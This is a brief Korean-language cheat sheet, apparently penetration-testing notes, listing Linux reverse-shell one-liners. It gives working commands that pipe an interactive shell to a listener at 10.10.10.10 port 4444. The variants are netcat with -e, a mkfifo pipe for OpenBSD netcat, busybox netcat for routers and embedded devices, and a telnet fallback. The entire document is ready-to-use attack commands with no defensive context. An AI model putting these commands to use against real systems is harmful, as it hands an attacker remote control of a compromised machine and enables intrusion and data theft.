# linux netcat reverse shell

nc가 있을 때. `-e` 지원 여부로 방법이 갈린다 (`nc -h` 출력에 `-e` 확인).

```bash
# -e 지원 (traditional nc, ncat)
nc -e /bin/sh 10.10.10.10 4444

# -e 미지원 (Ubuntu 등 OpenBSD nc가 기본) — mkfifo 파이프
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.10.10 4444 >/tmp/f

# busybox가 있는 임베디드·라우터
busybox nc 10.10.10.10 4444 -e sh

# nc가 없고 telnet만 있을 때
TF=$(mktemp -u); mkfifo $TF && telnet 10.10.10.10 4444 0<$TF | sh 1>$TF
```
